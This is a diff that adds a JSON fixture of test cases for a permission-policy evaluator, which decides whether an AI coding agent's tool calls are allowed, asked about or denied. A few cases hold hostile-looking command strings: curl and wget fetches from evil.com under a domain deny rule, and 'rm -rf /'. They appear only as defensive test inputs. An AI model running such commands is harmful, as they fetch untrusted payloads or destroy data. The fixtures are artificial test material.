@@ -1,0 +1,772 @@
+{
+  "cases": [
+    {
+      "id": "evaluate-advanced.001",
+      "from": "evaluate-advanced.test.ts: Claude Code rule syntax > exact matching > matches exact command string",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "standard",
+        "rules": [
+          {
+            "tool": "Bash",
+            "pattern": "git status",
+            "tier": "allow"
+          }
+        ]
+      },
+      "tool": "bash",
+      "input": "git status",
+      "expect": "allow"
+    },
+    {
+      "id": "evaluate-advanced.002",
+      "from": "evaluate-advanced.test.ts: Claude Code rule syntax > exact matching > matches exact command string",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "standard",
+        "rules": [
+          {
+            "tool": "Bash",
+            "pattern": "git status",
+            "tier": "allow"
+          }
+        ]
+      },
+      "tool": "bash",
+      "input": "git status --short",
+      "expect": "ask"
+    },
+    {
+      "id": "evaluate-advanced.003",
+      "from": "evaluate-advanced.test.ts: Claude Code rule syntax > prefix matching — word boundary > matches command equal to prefix",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "standard",
+        "rules": [
+          {
+            "tool": "Bash",
+            "pattern": "git:*",
+            "tier": "allow"
+          }
+        ]
+      },
+      "tool": "bash",
+      "input": "git",
+      "expect": "allow"
+    },
+    {
+      "id": "evaluate-advanced.004",
+      "from": "evaluate-advanced.test.ts: Claude Code rule syntax > prefix matching — word boundary > matches command starting with prefix + space",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "standard",
+        "rules": [
+          {
+            "tool": "Bash",
+            "pattern": "npm:*",
+            "tier": "allow"
+          }
+        ]
+      },
+      "tool": "bash",
+      "input": "npm run test",
+      "expect": "allow"
+    },
+    {
+      "id": "evaluate-advanced.005",
+      "from": "evaluate-advanced.test.ts: Claude Code rule syntax > prefix matching — word boundary > matches command starting with prefix + space",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "standard",
+        "rules": [
+          {
+            "tool": "Bash",
+            "pattern": "npm:*",
+            "tier": "allow"
+          }
+        ]
+      },
+      "tool": "bash",
+      "input": "npm publish",
+      "expect": "allow"
+    },
+    {
+      "id": "evaluate-advanced.006",
+      "from": "evaluate-advanced.test.ts: Claude Code rule syntax > prefix matching — word boundary > does not match without word boundary",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "standard",
+        "rules": [
+          {
+            "tool": "Bash",
+            "pattern": "ls:*",
+            "tier": "allow"
+          }
+        ]
+      },
+      "tool": "bash",
+      "input": "lsattr",
+      "expect": "ask"
+    },
+    {
+      "id": "evaluate-advanced.007",
+      "from": "evaluate-advanced.test.ts: Claude Code rule syntax > prefix matching — word boundary > does not match without word boundary",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "standard",
+        "rules": [
+          {
+            "tool": "Bash",
+            "pattern": "ls:*",
+            "tier": "allow"
+          }
+        ]
+      },
+      "tool": "bash",
+      "input": "lsof",
+      "expect": "ask"
+    },
+    {
+      "id": "evaluate-advanced.008",
+      "from": "evaluate-advanced.test.ts: Claude Code rule syntax > wildcard matching > matches * anywhere in pattern",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "standard",
+        "rules": [
+          {
+            "tool": "Bash",
+            "pattern": "git commit *",
+            "tier": "allow"
+          }
+        ]
+      },
+      "tool": "bash",
+      "input": "git commit -m test",
+      "expect": "allow"
+    },
+    {
+      "id": "evaluate-advanced.009",
+      "from": "evaluate-advanced.test.ts: Claude Code rule syntax > wildcard matching > trailing * matches bare command too",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "standard",
+        "rules": [
+          {
+            "tool": "Bash",
+            "pattern": "git *",
+            "tier": "allow"
+          }
+        ]
+      },
+      "tool": "bash",
+      "input": "git",
+      "expect": "allow"
+    },
+    {
+      "id": "evaluate-advanced.010",
+      "from": "evaluate-advanced.test.ts: Claude Code rule syntax > wildcard matching > trailing * matches bare command too",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "standard",
+        "rules": [
+          {
+            "tool": "Bash",
+            "pattern": "git *",
+            "tier": "allow"
+          }
+        ]
+      },
+      "tool": "bash",
+      "input": "git add",
+      "expect": "allow"
+    },
+    {
+      "id": "evaluate-advanced.011",
+      "from": "evaluate-advanced.test.ts: Claude Code rule syntax > wildcard matching > trailing * matches bare command too",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "standard",
+        "rules": [
+          {
+            "tool": "Bash",
+            "pattern": "git *",
+            "tier": "allow"
+          }
+        ]
+      },
+      "tool": "bash",
+      "input": "git commit -m test",
+      "expect": "allow"
+    },
+    {
+      "id": "evaluate-advanced.012",
+      "from": "evaluate-advanced.test.ts: Claude Code rule syntax > wildcard matching > matches *suffix pattern",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "standard",
+        "rules": [
+          {
+            "tool": "Bash",
+            "pattern": "* Dockerfile",
+            "tier": "allow"
+          }
+        ]
+      },
+      "tool": "bash",
+      "input": "cat Dockerfile",
+      "expect": "allow"
+    },
+    {
+      "id": "evaluate-advanced.013",
+      "from": "evaluate-advanced.test.ts: Claude Code rule syntax > bare tool matching (no pattern) > absent pattern matches any input for that tool",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "standard",
+        "rules": [
+          {
+            "tool": "Bash",
+            "tier": "allow"
+          }
+        ]
+      },
+      "tool": "bash",
+      "input": "anything at all",
+      "expect": "allow"
+    },
+    {
+      "id": "evaluate-advanced.014",
+      "from": "evaluate-advanced.test.ts: Claude Code rule syntax > escape sequences > escaped parens in pattern become exact matches",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "standard",
+        "rules": [
+          {
+            "tool": "Custom",
+            "pattern": "git log \\(main\\)",
+            "tier": "allow"
+          }
+        ]
+      },
+      "tool": "custom",
+      "input": "git log (main)",
+      "expect": "allow"
+    },
+    {
+      "id": "evaluate-advanced.015",
+      "from": "evaluate-advanced.test.ts: Claude Code rule syntax > escape sequences > escaped parens in pattern become exact matches",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "standard",
+        "rules": [
+          {
+            "tool": "Custom",
+            "pattern": "git log \\(main\\)",
+            "tier": "allow"
+          }
+        ]
+      },
+      "tool": "custom",
+      "input": "git log main",
+      "expect": "ask"
+    },
+    {
+      "id": "evaluate-advanced.016",
+      "from": "evaluate-advanced.test.ts: Claude Code rule syntax > escape sequences > escaped asterisk is literal, not wildcard",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "standard",
+        "rules": [
+          {
+            "tool": "Custom",
+            "pattern": "echo \\*",
+            "tier": "allow"
+          }
+        ]
+      },
+      "tool": "custom",
+      "input": "echo *",
+      "expect": "allow"
+    },
+    {
+      "id": "evaluate-advanced.017",
+      "from": "evaluate-advanced.test.ts: Claude Code rule syntax > escape sequences > escaped asterisk is literal, not wildcard",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "standard",
+        "rules": [
+          {
+            "tool": "Custom",
+            "pattern": "echo \\*",
+            "tier": "allow"
+          }
+        ]
+      },
+      "tool": "custom",
+      "input": "echo hello",
+      "expect": "ask"
+    },
+    {
+      "id": "evaluate-advanced.018",
+      "from": "evaluate-advanced.test.ts: Claude Code rule syntax > escape sequences > escaped backslash is literal",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "standard",
+        "rules": [
+          {
+            "tool": "Custom",
+            "pattern": "echo \\\\",
+            "tier": "allow"
+          }
+        ]
+      },
+      "tool": "custom",
+      "input": "echo \\",
+      "expect": "allow"
+    },
+    {
+      "id": "evaluate-advanced.019",
+      "from": "evaluate-advanced.test.ts: Claude Code rule syntax > domain pattern > matches when input contains the domain",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "standard",
+        "rules": [
+          {
+            "tool": "Bash",
+            "pattern": "domain:evil.com",
+            "tier": "deny"
+          }
+        ]
+      },
+      "tool": "bash",
+      "input": "curl https://evil.com/payload",
+      "expect": "deny"
+    },
+    {
+      "id": "evaluate-advanced.020",
+      "from": "evaluate-advanced.test.ts: Claude Code rule syntax > domain pattern > matches domain as substring of hostname",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "standard",
+        "rules": [
+          {
+            "tool": "Bash",
+            "pattern": "domain:evil.com",
+            "tier": "deny"
+          }
+        ]
+      },
+      "tool": "bash",
+      "input": "wget sub.evil.com/path",
+      "expect": "deny"
+    },
+    {
+      "id": "evaluate-advanced.021",
+      "from": "evaluate-advanced.test.ts: Claude Code rule syntax > MCP tool matching > matches entire MCP server",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "standard",
+        "rules": [
+          {
+            "tool": "mcp__github",
+            "tier": "allow"
+          }
+        ]
+      },
+      "tool": "mcp__github__create_issue",
+      "input": "{}",
+      "expect": "allow"
+    },
+    {
+      "id": "evaluate-advanced.022",
+      "from": "evaluate-advanced.test.ts: Claude Code rule syntax > MCP tool matching > matches entire MCP server",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "standard",
+        "rules": [
+          {
+            "tool": "mcp__github",
+            "tier": "allow"
+          }
+        ]
+      },
+      "tool": "mcp__github__list_prs",
+      "input": "{}",
+      "expect": "allow"
+    },
+    {
+      "id": "evaluate-advanced.023",
+      "from": "evaluate-advanced.test.ts: Claude Code rule syntax > MCP tool matching > matches MCP server wildcard",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "standard",
+        "rules": [
+          {
+            "tool": "mcp__*__delete*",
+            "tier": "deny"
+          }
+        ]
+      },
+      "tool": "mcp__github__delete_issue",
+      "input": "{}",
+      "expect": "deny"
+    },
+    {
+      "id": "evaluate-advanced.024",
+      "from": "evaluate-advanced.test.ts: Claude Code rule syntax > MCP tool matching > matches MCP server wildcard",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "standard",
+        "rules": [
+          {
+            "tool": "mcp__*__delete*",
+            "tier": "deny"
+          }
+        ]
+      },
+      "tool": "mcp__jira__delete_ticket",
+      "input": "{}",
+      "expect": "deny"
+    },
+    {
+      "id": "evaluate-advanced.025",
+      "from": "evaluate-advanced.test.ts: Claude Code rule syntax > string rule normalisation > normalises bare tool name",
+      "kind": "function",
+      "module": "evaluate",
+      "function": "normaliseStringRule",
+      "args": ["Read", "allow"],
+      "expect": {
+        "tool": "Read",
+        "tier": "allow"
+      }
+    },
+    {
+      "id": "evaluate-advanced.026",
+      "from": "evaluate-advanced.test.ts: Claude Code rule syntax > string rule normalisation > normalises tool with pattern",
+      "kind": "function",
+      "module": "evaluate",
+      "function": "normaliseStringRule",
+      "args": ["Bash(git status)", "allow"],
+      "expect": {
+        "tool": "Bash",
+        "pattern": "git status",
+        "tier": "allow"
+      }
+    },
+    {
+      "id": "evaluate-advanced.027",
+      "from": "evaluate-advanced.test.ts: Claude Code rule syntax > string rule normalisation > normalises tool with prefix pattern",
+      "kind": "function",
+      "module": "evaluate",
+      "function": "normaliseStringRule",
+      "args": ["Bash(npm:*)", "deny"],
+      "expect": {
+        "tool": "Bash",
+        "pattern": "npm:*",
+        "tier": "deny"
+      }
+    },
+    {
+      "id": "evaluate-advanced.028",
+      "from": "evaluate-advanced.test.ts: Claude Code rule syntax > string rule normalisation > normalises empty parens as bare tool",
+      "kind": "function",
+      "module": "evaluate",
+      "function": "normaliseStringRule",
+      "args": ["Bash()", "allow"],
+      "expect": {
+        "tool": "Bash",
+        "tier": "allow"
+      }
+    },
+    {
+      "id": "evaluate-advanced.029",
+      "from": "evaluate-advanced.test.ts: Claude Code rule syntax > string rule normalisation > normalises star parens as bare tool",
+      "kind": "function",
+      "module": "evaluate",
+      "function": "normaliseStringRule",
+      "args": ["Bash(*)", "allow"],
+      "expect": {
+        "tool": "Bash",
+        "tier": "allow"
+      }
+    },
+    {
+      "id": "evaluate-advanced.030",
+      "from": "evaluate-advanced.test.ts: conditional rules > basic matching > ask tier is checked before allow tier",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "standard",
+        "rules": [
+          {
+            "tool": "Bash",
+            "pattern": "npm run *",
+            "tier": "allow"
+          },
+          {
+            "tool": "Bash",
+            "pattern": "npm run build",
+            "tier": "ask"
+          }
+        ]
+      },
+      "tool": "bash",
+      "input": "npm run build",
+      "expect": "ask"
+    },
+    {
+      "id": "evaluate-advanced.031",
+      "from": "evaluate-advanced.test.ts: conditional rules > basic matching > falls through to defaultMode when no rule matches",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "standard",
+        "rules": [
+          {
+            "tool": "Bash",
+            "pattern": "npm:*",
+            "tier": "allow"
+          }
+        ]
+      },
+      "tool": "bash",
+      "input": "npm install",
+      "expect": "allow"
+    },
+    {
+      "id": "evaluate-advanced.032",
+      "from": "evaluate-advanced.test.ts: conditional rules > basic matching > falls through to defaultMode when no rule matches",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "standard",
+        "rules": [
+          {
+            "tool": "Bash",
+            "pattern": "npm:*",
+            "tier": "allow"
+          }
+        ]
+      },
+      "tool": "bash",
+      "input": "rm -rf /",
+      "expect": "ask"
+    },
+    {
+      "id": "evaluate-advanced.033",
+      "from": "evaluate-advanced.test.ts: conditional rules > basic matching > prefix pattern in conditional rule",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "standard",
+        "rules": [
+          {
+            "tool": "Bash",
+            "pattern": "git:*",
+            "tier": "allow"
+          }
+        ]
+      },
+      "tool": "bash",
+      "input": "git status",
+      "expect": "allow"
+    },
+    {
+      "id": "evaluate-advanced.034",
+      "from": "evaluate-advanced.test.ts: conditional rules > basic matching > prefix pattern in conditional rule",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "standard",
+        "rules": [
+          {
+            "tool": "Bash",
+            "pattern": "git:*",
+            "tier": "allow"
+          }
+        ]
+      },
+      "tool": "bash",
+      "input": "npm install",
+      "expect": "ask"
+    },
+    {
+      "id": "evaluate-advanced.035",
+      "from": "evaluate-advanced.test.ts: conditional rules > basic matching > exact pattern in conditional rule",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "standard",
+        "rules": [
+          {
+            "tool": "Bash",
+            "pattern": "git status",
+            "tier": "allow"
+          }
+        ]
+      },
+      "tool": "bash",
+      "input": "git status",
+      "expect": "allow"
+    },
+    {
+      "id": "evaluate-advanced.036",
+      "from": "evaluate-advanced.test.ts: conditional rules > basic matching > exact pattern in conditional rule",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "standard",
+        "rules": [
+          {
+            "tool": "Bash",
+            "pattern": "git status",
+            "tier": "allow"
+          }
+        ]
+      },
+      "tool": "bash",
+      "input": "git status --short",
+      "expect": "ask"
+    },
+    {
+      "id": "evaluate-advanced.037",
+      "from": "evaluate-advanced.test.ts: conditional rules > when conditions > matches when cwd condition matches",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "standard",
+        "rules": [
+          {
+            "tool": "Bash",
+            "pattern": "npm run *",
+            "tier": "allow",
+            "when": {
+              "cwd": "./packages/*"
+            }
+          }
+        ]
+      },
+      "tool": "bash",
+      "input": "npm run test",
+      "expect": "allow",
+      "context": {
+        "cwd": "./packages/api"
+      }
+    },
+    {
+      "id": "evaluate-advanced.038",
+      "from": "evaluate-advanced.test.ts: conditional rules > when conditions > matches when cwd condition matches",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "standard",
+        "rules": [
+          {
+            "tool": "Bash",
+            "pattern": "npm run *",
+            "tier": "allow",
+            "when": {
+              "cwd": "./packages/*"
+            }
+          }
+        ]
+      },
+      "tool": "bash",
+      "input": "npm run test",
+      "expect": "ask",
+      "context": {
+        "cwd": "./scripts"
+      }
+    },
+    {
+      "id": "evaluate-advanced.039",
+      "from": "evaluate-advanced.test.ts: conditional rules > when conditions > matches when branch condition matches",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "standard",
+        "rules": [
+          {
+            "tool": "Write",
+            "pattern": "./config/**",
+            "tier": "ask",
+            "when": {
+              "branch": "main"
+            }
+          }
+        ]
+      },
+      "tool": "write",
+      "input": "./config/app.yaml",
+      "expect": "ask",
+      "context": {
+        "branch": "main"
+      }
+    },
+    {
+      "id": "evaluate-advanced.040",
+      "from": "evaluate-advanced.test.ts: conditional rules > when conditions > matches when branch condition matches",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "standard",
+        "rules": [
+          {
+            "tool": "Write",
+            "pattern": "./config/**",
+            "tier": "ask",
+            "when": {
+              "branch": "main"
+            }
+          }
+        ]
+      },
+      "tool": "write",
+      "input": "./config/app.yaml",
+      "expect": "ask",
+      "context": {
+        "branch": "feature/test"
+      }
+    },
+    {
+      "id": "evaluate-advanced.041",
+      "from": "evaluate-advanced.test.ts: conditional rules > when conditions > AND logic — all conditions must match",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "standard",
+        "rules": [
+          {
+            "tool": "Bash",
+            "pattern": "npm publish:*",
+            "tier": "deny",
+            "when": {
+              "cwd": "./packages/core",
+              "branch": "main"
+            }
+          }
+        ]
+      },
+      "tool": "bash",
+      "input": "npm publish --access public",
+      "expect": "deny",
+      "context": {
+        "cwd": "./packages/core",
+        "branch": "main"
+      }
+    },
+    {
+      "id": "evaluate-advanced.042",
+      "from": "evaluate-advanced.test.ts: conditional rules > when conditions > AND logic — all conditions must match",
+      "kind": "evaluate",
+      "policy": {
+        "defaultMode": "standard",
+        "rules": [
+          {
+            "tool": "Bash",
+            "pattern": "npm publish:*",
+            "tier": "deny",
+            "when": {
+              "cwd": "./packages/core",
+              "branch": "main"
+            }
+          }
+        ]
+      },
+      "tool": "bash",
+      "input": "npm publish --access public",
+      "expect": "ask",
+      "context": {
+        "cwd": "./packages/utils",
+        "branch": "main"
+      }
+    }
+  ]
+}
